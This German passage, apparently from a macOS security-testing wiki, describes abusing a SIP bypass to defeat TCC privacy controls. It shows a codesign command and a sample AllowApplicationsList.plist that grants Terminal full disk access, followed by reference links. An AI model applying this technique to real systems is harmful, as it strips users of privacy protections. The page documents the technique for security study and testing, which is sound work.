Es gibt jedoch noch eine weitere Möglichkeit, diesen **SIP-Bypass zum Umgehen von TCC** zu missbrauchen: Die Datei `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` ist eine Allowlist von Anwendungen, die eine TCC-Ausnahme benötigen. Wenn ein Angreifer daher den **SIP-Schutz** dieser Datei **entfernen** und seine **eigene Anwendung** hinzufügen kann, kann die Anwendung TCC umgehen.\
Zum Beispiel, um Terminal hinzuzufügen:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC-Umgehungen


{{#ref}}
macos-tcc-bypasses/
{{#endref}}

## Referenzen

- [1] [Ein detaillierter Einblick in macOS TCC.db - Rainforest QA Blog](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [2] [maclTrack.command - Script zum Verfolgen von com.apple.macl (Gist von brunerd)](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [3] [com.apple.macl verfolgen und handhaben](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [4] [Umgehung der macOS-TCC-Benutzer- und Datenschutzmechanismen durch Zufall und gezieltes Design](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)

{{#include ../../../../banners/hacktricks-training.md}}
